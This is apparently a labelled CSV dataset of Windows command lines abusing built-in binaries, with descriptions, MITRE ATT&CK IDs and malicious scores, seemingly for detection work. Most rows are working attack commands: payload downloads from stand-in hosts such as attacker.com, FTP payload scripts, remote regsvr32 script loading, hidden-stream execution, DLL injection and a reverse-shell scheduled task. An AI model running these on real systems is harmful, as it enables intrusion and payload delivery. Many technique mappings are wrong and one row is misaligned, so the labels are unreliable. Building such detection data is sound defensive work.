Prompt,Description,LOLBin,Content,Frequency,Source,Network,Behavioural,History,MITRE ID,MITRE Technique,Score,Type
bitsadmin,Transfers files using Windows Background Intelligent Transfer Service,Yes,Files,Rare,Script,Yes,Tool Transfer,Used in malware campaigns,T1105,Ingress Tool Transfer,1,Malicious
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,Downloads files from a remote URL and stores locally,Yes,Web,Rare,User Input,Yes,Tool Transfer,Used in red team operations,T1105,Ingress Tool Transfer,0.9,Malicious
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/... > file.doc:payload.bat,Writes a malicious payload to an alternate data stream,Yes,Files,Rare,Script,Yes,Code Injection,Observed in malware chains,T1117,Regsvr32,1,Malicious
cscript c:\ads\file.txt:script.vbs,Executes script stored in alternate data stream,Yes,Scripts,Rare,Script,No,ADS Execution,Known malware evasion technique,T1564.004,Hidden Files and ADS,0.9,Malicious
cmstp.exe /ni /s https://raw.githubusercontent.com/.../Cmstp.inf,Abuses cmstp to execute remote script via INF file,Yes,Scripts,Rare,Remote,Yes,LOLBin Exploitation,Used in Cobalt Strike,T1218.003,CMSTP,1,Malicious
bash.exe -c calc.exe,Abuses WSL (bash) to launch Windows process,No,System,Rare,Script,No,Cross-platform Execution,Seen in Red Canary tests,T1059.004,Unix Shell,0.85,Malicious
ATBroker.exe /start malware,Launches custom executable using ATBroker accessibility tool,Yes,Executable,Rare,System,No,Bypass UAC,Used in privilege escalation chains,T1546.008,Accessibility Features,0.8,Malicious
bitsadmin /create 1 & bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe ...,Creates a download job to fetch sysinternals tool from the internet,Yes,Files,Rare,Script,Yes,Remote File Transfer,Seen in attacker toolkits,T1105,Ingress Tool Transfer,1,Malicious
certreq -post -config https://example.org/ ...,Forces certificate request from remote endpoint,Yes,Registry,Rare,Script,Yes,Network Exploitation,Exploited in phishing kits,T1140,Deobfuscate/Decode Files,1,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://11.11.11.11/encoded,Creates file in system directory from URL,Yes,Files,Rare,Remote,Yes,Remote File Dropper,Seen in malware drop campaigns,T1055.001,Dynamic-link Library Injection,1,Malicious
dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \193.168.0.149\dll\wtf.dll,Abuses DNS server to load remote DLL from attacker machine,Yes,Network,Rare,Remote,Yes,Lateral Movement,Seen in internal pivoting,T1574.002,DLL Side-Loading,1,Malicious
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt,Posts certificate request to remote server using local system file,Yes,Files,Rare,Script,Yes,Certificate Abuse,Seen in exploit kits,T1140,Deobfuscate/Decode Files,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile,Transfers remote payload into system directory via ConfigSecurityPolicy,Yes,Files,Rare,Remote,Yes,Payload Delivery,Observed in lateral movement,T1105,Ingress Tool Transfer,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://11.11.11.11/xxxxxxxxx?encodedfile,Writes executable to system directory from external URL,Yes,Files,Rare,Remote,Yes,Remote Execution,Related to dropper activity,T1055,Process Injection,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,Writes suspicious file via URL to sensitive path,Yes,Files,Rare,Remote,Yes,Payload Deployment,Used in red team simulations,T1566,Phishing,1,Malicious
control.exe c:\windows\tasks\file.txt:evil.dll,Uses control panel to execute DLL from alternate data stream,Yes,Files,Rare,Local,No,ADS Execution,Exploited by ransomware,T1564.004,Hidden Files and ADS,0.8,Malicious
csc.exe -out:My.exe File.cs,Compiles source code into executable (can be abused),Yes,Executable,Common,User Input,No,Code Generation,Used by malware loaders,T1505.003,Compiled HTML File,0.6,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,Writes executable to system32 from external resource,Yes,Files,Rare,Remote,Yes,System File Injection,Seen in APT toolchains,T1055.001,DLL Injection,1,Malicious
diskshadow.exe /s c:\test\diskshadow.txt,Automates backup operations that could hide malware,Yes,Files,Rare,Script,No,Shadow Copy Abuse,Abused in ransomware,T1003.003,NTDS,0.9,Malicious
dllhost.exe /Processid:{CLSID},"Launches DLL using CLSID, potentially sideloading",Yes,DLL,Rare,System,No,DLL Sideloading,Exploited by malware families,T1574.002,DLL Side-Loading,0.8,Malicious
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \192.168.0.149\dll\wtf.dll,Modifies DNS server to load DLL from remote share,Yes,Network,Rare,Remote,Yes,Remote DLL Load,Seen in domain persistence,T1574.002,DLL Side-Loading,1,Malicious
esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o,Copies VBScript file using ESENT API tool,Yes,Files,Rare,Local,No,File Obfuscation,Occasionally used by malware,T1027,Obfuscated Files or Information,0.8,Malicious
esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o,Writes file into alternate data stream using ESENT,Yes,Files,Rare,Local,No,ADS Injection,Observed in stealth malware,T1564.004,Hidden Files and ADS,0.8,Malicious
esentutl.exe /y \live.sysinternals.com\tools\adrestore.exe /d \otherwebdavserver\webdav\adrestore.exe /o,Transfers tool across remote servers,Yes,Network,Rare,Remote,Yes,Tool Transfer,Used in red teaming,T1105,Ingress Tool Transfer,1,Malicious
esentutl.exe /y \11.11.11.11\tools\adrestore.exe /d \otherwebdavserver\webdav\adrestore.exe /o,Transfers executable between servers,Yes,Network,Rare,Remote,Yes,Remote File Injection,Seen in lateral movement,T1105,Ingress Tool Transfer,1,Malicious
eventvwr.exe,Executes snap-ins and can be used for UAC bypass,Yes,System,Rare,Local,No,Privilege Escalation,Abused in UAC bypass,T1548.002,Bypass User Account Control,0.8,Malicious
expand \webdav\folder\file.bat c:\ADS\file.bat,Expands remote file from webdav into alternate data stream,Yes,Files,Rare,Remote,Yes,ADS Write,Used in stealthy file drops,T1564.004,Hidden Files and ADS,1,Malicious
diantz.exe \remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab,Compresses remote file using diantz,Yes,Files,Rare,Remote,Yes,Lateral Tool Transfer,Known in payload staging,T1105,Ingress Tool Transfer,1,Malicious
diantz.exe \11.121.12.13\pathToFile\file.exe c:\destinationFolder\file.cab,Uses UNC path to move files from another host,Yes,Files,Rare,Remote,Yes,Remote Copy,Seen in ransomware distribution,T1570,Lateral Tool Transfer,1,Malicious
diantz.exe \10.10.10.10\pathToFile\file.exe c:\destinationFolder\file.cab,Transfers executable from remote server for compression,Yes,Files,Rare,Remote,Yes,Payload Prep,Used by loaders,T1105,Ingress Tool Transfer,1,Malicious
diskshadow> exec calc.exe,Executes a program using diskshadow script context,Yes,System,Rare,Script,No,Shadow Copy Execution,Used in stealth execution chains,T1059.003,Windows Command Shell,0.9,Malicious
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,Launches App Installer to install app from public pastebin URL,No,Web,Rare,User Input,Yes,App Installer Abuse,Seen in social engineering,T1204.002,Malicious File,0.85,Malicious
start ms-appinstaller://?source=https://10.101.10.10/raw/tdyShwLw,Triggers App Installer from IP-hosted location,No,Web,Rare,Remote,Yes,App Installer Abuse,Reported in red team ops,T1204.002,Malicious File,0.95,Malicious
start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw,Uses App Installer with suspicious external source,No,Web,Rare,Remote,Yes,App Installer Abuse,Seen in phishing delivery,T1204.002,Malicious File,0.95,Malicious
AT.exe at 09:00 /interactive /every:m,Schedules task with interactive execution via AT,Yes,System,Rare,Local,No,Task Scheduling,"Legacy tool, often abused",T1053.002,Scheduled Task,0.8,Malicious
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,Creates download job for tool from remote server,Yes,Files,Rare,Script,Yes,Tool Transfer,Used in attacker staging,T1105,Ingress Tool Transfer,1,Malicious
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,Uses BITS to move cmd.exe and complete job chain,Yes,Files,Rare,Script,No,LOLBin File Abuse,Used in privilege abuse,T1218.007,LOLBins,0.9,Malicious
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,Abuses BITS and SetNotifyCmdLine to trigger payload,Yes,Files,Rare,Script,No,LOLBin Execution,Known evasive technique,T1218.007,LOLBins,0.9,Malicious
certutil -encode inputFileName encodedOutputFileName,Encodes input file using Certutil (potential for obfuscation),Yes,Files,Rare,Local,No,File Obfuscation,Common in malware chains,T1027,Obfuscated Files,0.8,Malicious
certutil -decode encodedInputFileName decodedOutputFileName,Decodes file using Certutil (commonly abused),Yes,Files,Rare,Local,No,File Restoration,Reverses encoded payloads,T1027,Obfuscated Files,0.8,Malicious
msbuild.exe pshell.xml,Executes embedded PowerShell via malicious MSBuild XML project,Yes,Scripts,Rare,Script,No,LOLBin Execution,Popular technique in APTs,T1127.001,MSBuild,0.9,Malicious
msbuild.exe project.csproj,"Compiles and runs embedded code in .csproj, possibly weaponized",Yes,Scripts,Rare,Script,No,Code Compilation Abuse,Used by malware loaders,T1127.001,MSBuild,0.9,Malicious
Msconfig.exe -5,Launches msconfig with invalid parameter — suspicious pattern,Yes,Executable,Rare,Local,No,Parameter Abuse,Not commonly seen,T1202,Indirect Command Execution,0.8,Malicious
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE,Executes diagnostic script via msdt — often used in Follina attack,Yes,XML,Rare,Script,No,Diagnostic Hijack,Confirmed in CVE-2022-30190,T1218.004,Msdt,0.9,Malicious
mshta.exe evilfile.hta,Executes a malicious .hta application via HTML Application host,Yes,Scripts,Rare,Local,No,LOLBin Script Execution,Abused in phishing lures,T1216.001,Mshta,0.8,Malicious
"mshta.exe ""C:\ads\file.txt:file.hta""",Executes HTA file embedded in alternate data stream,Yes,Files,Rare,Local,No,ADS Execution,Used in stealth attacks,T1564.004,Hidden Files and ADS,0.8,Malicious
msiexec /quiet /i cmd.msi,Silently installs MSI that may contain payloads,Yes,Executable,Rare,Script,No,Application Install Abuse,Seen in persistence tools,T1218.007,Msiexec,0.9,Malicious
netsh.exe add helper C:\Users\User\file.dll,Adds a helper DLL via netsh for persistent command execution,Yes,DLL,Rare,Local,No,Registry/Config Injection,Used in local privilege attacks,T1546.007,Netsh Helper DLL,0.8,Malicious
odbcconf -f file.rsp,"Executes response file, may lead to command injection",Yes,Scripts,Rare,Script,No,Parameter Injection,Documented in attack chains,T1218,Signed Binary Proxy Execution,0.9,Malicious
pcalua.exe -a calc.exe,Executes arbitrary application through Program Compatibility Assistant,Yes,Executable,Rare,Local,No,LOLBin Execution,Reported in living-off-the-land attacks,T1218,Signed Binary Proxy Execution,0.8,Malicious
expand c:\ADS\file1.bat c:\ADS\file2.bat,Uses expand to write batch file to alternate data stream,Yes,Files,Rare,Local,No,ADS Abuse,Used in red team exercises,T1564.004,Hidden Files and ADS,0.8,Malicious
expand \webdav\folder\file.bat c:\ADS\file.txt:file.bat,Expands remote WebDAV script into an alternate data stream,Yes,Files,Rare,Remote,Yes,ADS Write,Seen in phishing payloads,T1564.004,Hidden Files and ADS,1,Malicious
expand \11.12.13.14\folder\file.bat c:\ADS\file.txt:file.bat,Expands batch file from IP-based UNC path to ADS,Yes,Files,Rare,Remote,Yes,File Obfuscation,Known in obfuscated delivery,T1027,Obfuscated Files,1,Malicious
expand \10.10.10.10\folder\file.bat c:\ADS\file.txt:file.bat,"Same as above, using internal IP address",Yes,Files,Rare,Remote,Yes,Stealth Payload Deployment,Red team simulation use,T1564.004,Hidden Files and ADS,1,Malicious
explorer.exe /root,Launches explorer shell with root directory view,No,System,Common,Local,No,Explorer Shell Abuse,"Minimal threat, seen in misconfigs",T1005,Data from Local System,0.55,Suspicious
Extexport.exe c:\test foo bar,"Unknown or uncommon binary used for export, potentially suspicious",No,Files,Rare,Script,No,Uncommon Binary Execution,"Rarely seen, may need analysis",T1218,Signed Binary Proxy Execution,0.85,Malicious
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe,Uses extrac32 to extract tool to an alternate data stream,Yes,Files,Rare,Local,No,ADS Execution,Observed in dropper routines,T1564.004,Hidden Files and ADS,0.8,Malicious
extrac32 /Y /C \webdavserver\share\test.txt C:\folder\test.txt,Silent extraction of remote file over WebDAV,Yes,Files,Rare,Remote,Yes,Remote File Fetch,Seen in red team scenarios,T1105,Ingress Tool Transfer,1,Malicious
extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe,Extracts a system binary to user folder,Yes,Files,Rare,Local,No,Local File Abuse,Tool misuse observed in tests,T1218,Signed Binary Proxy Execution,0.8,Malicious
findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe,Writes filtered string to ADS using findstr,No,Files,Rare,Script,No,Data Obfuscation,Known evasive method,T1564.004,Hidden Files and ADS,0.85,Malicious
findstr /S /I cpassword \sysvol\policies*.xml,Searches for plaintext credentials in SYSVOL policy files,No,Credentials,Rare,Script,No,Credential Harvesting,Common red team tactic,T1552.006,Group Policy Preferences,0.85,Malicious
findstr /V /L W3AllLov3DonaldTrump \webdavserver\folder\file.exe > c:\ADS\file.exe,Filters and writes content to a file from remote WebDAV share,No,Files,Rare,Remote,Yes,Stealth Transfer,Seen in evasion techniques,T1020,Automated Exfiltration,0.95,Malicious
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,Abuses forfiles to trigger calculator via system scan,Yes,Executable,Rare,Script,No,Binary Proxy Execution,Used in command injection chains,T1202,Indirect Command Execution,0.9,Malicious
"forfiles /p c:\windows\system32 /m notepad.exe /c ""c:\folder\normal.dll:evil.exe""",Uses forfiles to invoke hidden DLL in ADS,Yes,Files,Rare,Script,No,ADS DLL Execution,Known stealth trick,T1564.004,Hidden Files and ADS,0.9,Malicious
echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt,Crafts FTP script and downloads executable,No,Files,Rare,Script,Yes,Network File Transfer,Common payload delivery method,T1105,Ingress Tool Transfer,0.95,Malicious
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Creates and runs FTP batch file for malicious payload,No,Files,Rare,Script,Yes,Stealthy File Drop,Seen in legacy attacks,T1105,Ingress Tool Transfer,0.95,Malicious
"cmd.exe /c ""@echo open 11.11.11.11 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Same as above with direct IP usage,No,Files,Rare,Remote,Yes,Network Payload Drop,Observed in exploit kits,T1105,Ingress Tool Transfer,0.95,Malicious
"cmd.exe /c ""@echo open 10.10.10.10 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Legacy FTP-based payload delivery with internal IP,No,Files,Rare,Remote,Yes,FTP Abuse,Noted in post-exploit scripts,T1105,Ingress Tool Transfer,0.95,Malicious
"C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""",Uses legitimate Intel wrapper to download remote payload,Yes,Files,Rare,Remote,Yes,LOLBin File Drop,Seen in APT attacks,T1218,Signed Binary Proxy Execution,1,Malicious
Gpscript /logon,"Executes Group Policy script processing, potentially abused",Yes,Scripts,Rare,System,No,Policy Execution Hijack,Abused in persistent malware,T1053.005,Scheduled Task via GPO,0.8,Malicious
HH.exe http://some.url/script.ps1,Uses HTML Help executable to download and execute remote script,Yes,Scripts,Rare,Remote,Yes,LOLBin Execution,Seen in phishing and initial access,T1218.001,Signed Binary Proxy Execution,1,Malicious
HH.exe c:\windows\system32\calc.exe,"Executes local binary via hh.exe, abusing LOLBin capability",Yes,Executable,Rare,Local,No,Local Binary Proxy,Observed in evasion routines,T1218.001,Signed Binary Proxy Execution,0.8,Malicious
ie4uinit.exe -BaseSettings,Executes IE user initialization script with low visibility,Yes,Registry,Rare,Local,No,LOLBin Initialization Abuse,Known in UAC bypass techniques,T1548.002,Bypass User Account Control,0.8,Malicious
ieexec.exe http://x.x.x.x:8080/bypass.exe,Executes file from a remote URL via Internet Explorer executor,Yes,Files,Rare,Remote,Yes,Remote Execution,Used in red team post-exploitation,T1105,Ingress Tool Transfer,1,Malicious
ieexec.exe http://10.10.10.10:8080/bypass.exe,Same as above with internal IP usage,Yes,Files,Rare,Remote,Yes,Network Payload Execution,Seen in internal phishing,T1105,Ingress Tool Transfer,1,Malicious
ieexec.exe http://11.11.11.11:8080/bypass.exe,Uses IE execution engine to run remote payload,Yes,Files,Rare,Remote,Yes,LOLBin Exploitation,Documented in threat research,T1218.005,Mshta,1,Malicious
ilasm.exe C:\public\test.txt /exe,Assembles IL code into an executable binary,Yes,Executable,Rare,User Input,No,Compilation Abuse,Can be used for payload crafting,T1027.004,Compile After Delivery,0.8,Malicious
InfDefaultInstall.exe Infdefaultinstall.inf,Executes INF installation script for driver/config abuse,Yes,Registry,Rare,Script,No,File Execution Hijack,Abused to run unsigned code,T1218.010,Installer Packages,0.9,Malicious
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Executes .NET DLL via installer utility,Yes,DLL,Rare,Script,No,DLL Sideload,Widely abused LOLBin,T1218.004,InstallUtil,0.9,Malicious
jsc.exe scriptfile.js,Compiles JavaScript into .NET executable,Yes,Scripts,Rare,User Input,No,Code Compilation,Used in dropper behavior,T1027.004,Compile After Delivery,0.8,Malicious
makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab,Uses makecab to compress a binary into an alternate data stream,Yes,Files,Rare,Local,No,ADS Compression,Abused in stealth malware packing,T1564.004,Hidden Files and ADS,0.8,Malicious
makecab \webdavserver\webdav\file.exe C:\Folder\file.cab,Compresses executable from WebDAV share using makecab,Yes,Files,Rare,Remote,Yes,Network Compression,Known in staging techniques,T1105,Ingress Tool Transfer,1,Malicious
makecab \10.10.10.10\webdav\file.exe C:\Folder\file.cab,Same technique using IP-based WebDAV share,Yes,Files,Rare,Remote,Yes,File Transfer via LOLBin,Seen in APT operations,T1105,Ingress Tool Transfer,1,Malicious
MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll,Injects malicious DLL into running process via PID,Yes,DLL,Rare,Script,No,DLL Injection,Used in reflective loading attacks,T1055.001,DLL Injection,0.9,Malicious
"Mavinject.exe 4172 /INJECTRUNNING ""c:\ads\file.txt:file.dll""",Injects DLL from ADS into a live process,Yes,DLL,Rare,Script,No,ADS DLL Injection,Advanced stealth method,T1564.004,Hidden Files and ADS,0.9,Malicious
Microsoft.Workflow.Compiler.exe tests.xml results.xml,Executes compiled workflow from XML input,No,XML,Rare,Script,No,Execution via Workflow Compiler,Seen in niche delivery tools,T1059,Command and Scripting Interpreter,0.85,Malicious
Microsoft.Workflow.Compiler.exe tests.txt results.txt,"Tries to compile non-XML file, suspicious behavior",No,Files,Rare,Script,No,Suspicious File Handling,May indicate misuse,T1202,Indirect Command Execution,0.85,Malicious
mmc.exe -Embedding c:\path\to\test.msc,Embeds console view from malicious MSC file,Yes,Registry,Rare,Local,No,Signed Binary Hijack,Used in persistence,T1547.010,Component Object Model Hijacking,0.8,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\beacon.exe,Uses Microsoft Defender CLI to download payload,Yes,Files,Rare,Remote,Yes,LOLBin Download Abuse,Confirmed in red team reports,T1218,Signed Binary Proxy Execution,1,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\nicefile.txt:evil.exe,Downloads payload directly into ADS using Defender binary,Yes,Files,Rare,Remote,Yes,LOLBin ADS Download,Observed in evasive campaigns,T1564.004,Hidden Files and ADS,1,Malicious
Pcwrun.exe c:\temp\beacon.exe,Executes payload through PCW process context,Yes,Executable,Rare,Local,No,Stealth Process Launch,Used in red team post-exploit,T1059.003,Windows Command Shell,0.8,Malicious
pktmon.exe start --etw,Starts packet monitor with ETW — can be used for stealth sniffing,No,Network,Rare,Local,No,Network Monitoring,Seen in network recon efforts,T1040,Network Sniffing,0.75,Malicious
pnputil.exe -i -a C:\Users\hai\Desktop\mo.inf,Installs unsigned driver through driver installer utility,Yes,Driver,Rare,Script,No,Driver Abuse,Used in privilege escalation,T1543.003,Windows Service,0.9,Malicious
Presentationhost.exe C:\temp\Evil.xbap,Executes malicious .xbap through WPF presentation host,Yes,Scripts,Rare,Local,No,GUI App Execution Abuse,Used for stealth GUI launching,T1218,Signed Binary Proxy Execution,0.8,Malicious
print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe,Abuses print command to drop executable in ADS,No,Files,Rare,Local,No,Alternate Data Execution,Seen in stealth deployments,T1564.004,Hidden Files and ADS,0.75,Malicious
print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe,Copies file using print command for stealth,No,Files,Rare,Local,No,File Masquerading,Rare tactic in stealth malware,T1564,Hide Artifacts,0.75,Malicious
psr.exe /start /output D:\test.zip /sc 1 /gui 0,"Launches Problem Steps Recorder silently, potentially abused for keylogging",Yes,Files,Rare,Local,No,Input Capture,Observed in data collection scripts,T1056.001,Input Capture,0.8,Malicious
rasautou -d powershell.dll -p powershell -a a -e e,Loads PowerShell through Remote Access Auto Connection Manager,No,DLL,Rare,Local,No,DLL Proxy Execution,Documented in UAC bypasses,T1547.001,Registry Run Keys,0.75,Malicious
reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg,Exports registry data into alternate data stream,No,Registry,Rare,Script,No,Data Exfiltration,Seen in credential harvesting,T1119,Automated Collection,0.85,Malicious
regasm.exe AllTheThingsx64.dll,Registers malicious .NET DLL using RegAsm,Yes,DLL,Rare,Script,No,Registry Code Execution,Common DLL proxy technique,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
regasm.exe /U AllTheThingsx64.dll,"Unregisters .NET assembly via RegAsm, potentially evading defenses",Yes,DLL,Rare,Script,No,DLL Unregister Execution,Known in DLL abuse cases,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
regedit /E c:\ads\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey,Exports registry key into alternate data stream,Yes,Registry,Rare,Script,No,ADS Registry Dump,Used in persistence or exfiltration,T1119,Automated Collection,0.9,Malicious
regini.exe newfile.txt:hidden.ini,Modifies registry via script — can change security policies,No,Registry,Rare,Script,No,Registry Policy Tampering,Used in local persistence,T1547.001,Registry Run Keys,0.85,Malicious
"Register-cimprovider -path ""C:\folder\evil.dll""",Registers CIM provider DLL — can be abused for persistence,No,DLL,Rare,Local,No,WMI Provider Injection,Known in stealth persistence,T1546.003,WMI Event Subscription,0.75,Malicious
regsvcs.exe AllTheThingsx64.dll,Executes malicious .NET DLL via RegSvcs,Yes,DLL,Rare,Script,No,Binary Proxy Execution,LOLBin used in red teams,T1218.009,Regsvr32/Regasm/Regsvcs,0.9,Malicious
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll,Executes remote script via Regsvr32 (Squiblydoo),Yes,Scripts,Rare,Remote,Yes,Remote Script Execution,Very commonly abused,T1218.010,Regsvr32,1,Malicious
replace.exe C:\Source\File.cab C:\Destination /A,Replaces file via legacy utility — used to overwrite protected files,No,Files,Rare,Local,No,File Overwrite,Used in DLL injection chains,T1036.003,Masquerading,0.75,Malicious
replace.exe \webdav.host.com\foo\bar.exe c:\outdir /A,Replaces file using remote source via WebDAV,No,Files,Rare,Remote,Yes,File Masquerading,Used in lateral movement,T1105,Ingress Tool Transfer,0.95,Malicious
rundll32.exe AllTheThingsx64,Executes exported function from malicious DLL,Yes,DLL,Rare,Script,No,DLL Execution,Classic method in malware,T1218.011,Rundll32,0.9,Malicious
"rundll32 ""C:\ads\file.txt:ADSDLL.dll""",Executes DLL stored in alternate data stream using rundll32,Yes,DLL,Rare,Local,No,ADS DLL Execution,Stealthy execution observed,T1564.004,Hidden Files and ADS,0.8,Malicious
Runonce.exe /AlternateShellStartup,Executes programs via Alternate Shell in RunOnce,Yes,Registry,Rare,Local,No,Persistence via Registry,Known persistence method,T1547.001,Registry Run Keys,0.8,Malicious
runscripthelper.exe surfacecheck \?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test,Executes diagnostic script via runscripthelper,No,Script,Rare,Local,No,Scripting Engine Abuse,Seen in misused scripting utilities,T1059,Command and Scripting Interpreter,0.75,Malicious
"sc create evilservice binPath=""""c:\ADS\file.txt:cmd.exe"" /c echo works > ""c:\ADS\works.txt"""" DisplayName= ""evilservice"" start= auto & sc start evilservice",Creates and runs malicious service using ADS,Yes,Files,Rare,Script,No,ADS Service Execution,Reported in payload deployments,T1564.004,Hidden Files and ADS,0.9,Malicious
"schtasks /create /sc minute /mo 1 /tn ""Reverse shell"" /tr c:\some\directory\revshell.exe",Creates scheduled task to run reverse shell,Yes,Executable,Rare,Local,No,Scheduled Execution,Widely used in malware,T1053.005,Scheduled Task,0.8,Malicious
Scriptrunner.exe -appvscript calc.exe,Executes application through App-V scripting interface,No,Executable,Rare,Script,No,LOLBin App Execution,Seen in App-V abuse,T1216.001,Signed Binary Proxy Execution,0.85,Malicious
"SyncAppvPublishingServer.exe ""n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1')","IEX""",Executes remote PowerShell through SyncAppVPublishingServer,Yes,Script,Rare,Remote,Yes,PowerShell Over LOLBin,Observed in advanced techniques,T1059.001,0.55,Suspicious
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""C:/Windows/System32/calc.exe""",Injects and launches calc via Time Travel Debug DLL,No,Executable,Rare,Local,No,Debug Abuse,Seen in testing/abuse of injection,T1055,Process Injection,0.75,Malicious
tttracer.exe C:\windows\system32\calc.exe,Executes binary through trace analyzer,No,Executable,Rare,Local,No,DLL Execution Trick,Found in trace-based abuse,T1218,Signed Binary Proxy Execution,0.75,Malicious
vbc.exe /target:exe c:\temp\vbs\run.vb,Compiles VB code to executable for payload delivery,Yes,Executable,Rare,Script,No,Compile After Delivery,Abused for in-memory evasion,T1027.004,Compile After Delivery,0.9,Malicious
verclsid.exe /S /C {CLSID},"Validates CLSID for shell extension, can trigger malicious COM",Yes,Registry,Rare,Local,No,COM Hijack,Known persistence vector,T1546.015,Component Object Model Hijacking,0.8,Malicious
wab.exe,Launches Windows Address Book (can load malicious DLL),Yes,Executable,Rare,Local,No,DLL Load,Abused in DLL hijack,T1574.001,DLL Search Order Hijacking,0.8,Malicious
"wmic.exe process call create ""c:\ads\file.txt:program.exe""",Executes hidden payload from alternate data stream,Yes,Executable,Rare,Script,No,ADS Payload Execution,Seen in stealthy toolkits,T1564.004,Hidden Files and ADS,0.9,Malicious
wmic.exe process call create calc,Executes calc using WMI Process class,Yes,Executable,Common,Script,No,LOLBin Execution,Used in scripting chains,T1047,WMI,0.7,Malicious
wscript c:\ads\file.txt:script.vbs,Executes VBScript from alternate data stream using wscript,Yes,Scripts,Rare,Script,No,ADS Script Execution,Classic stealth technique,T1564.004,Hidden Files and ADS,0.9,Malicious
wsreset.exe,"Resets Windows Store, can be abused for unsigned execution",Yes,System,Rare,Local,No,LOLBin Abuse,Seen in misconfig-based abuse,T1218,Signed Binary Proxy Execution,0.8,Malicious
wuauclt.exe /UpdateDeploymentProvider /RunHandlerComServer,Executes DLL via Windows Update Client,Yes,DLL,Rare,Script,No,DLL Hijacking,Known red team method,T1218.007,LOLBins,0.9,Malicious
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},"Executes control wizard, abused for launching payloads",Yes,Executable,Rare,Local,No,Execution via Wizard Loader,Observed in APT playbooks,T1218,Signed Binary Proxy Execution,0.8,Malicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM,Executes remote payload using Wizard binary,Yes,Web,Rare,Remote,Yes,Wizard Payload Loader,Used in web-based staging,T1105,Ingress Tool Transfer,1,Malicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://10.10.10.10/raw/iLxUT5gM,"Same as above, IP-based",Yes,Web,Rare,Remote,Yes,Payload Delivery,Seen in penetration tests,T1105,Ingress Tool Transfer,1,Malicious
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://11.11.11.11/raw/iLxUT5gM,Uses XWizard to load script via external IP,Yes,Web,Rare,Remote,Yes,Web-Based Wizard Abuse,Documented in post-exploitation,T1105,Ingress Tool Transfer,1,Malicious
rundll32.exe advpack.dll,Executes DLL with rundll32 using Advpack — often misused,Yes,DLL,Rare,Local,No,DLL Execution,Observed in LOLBin attacks,T1218.011,Rundll32,0.8,Malicious
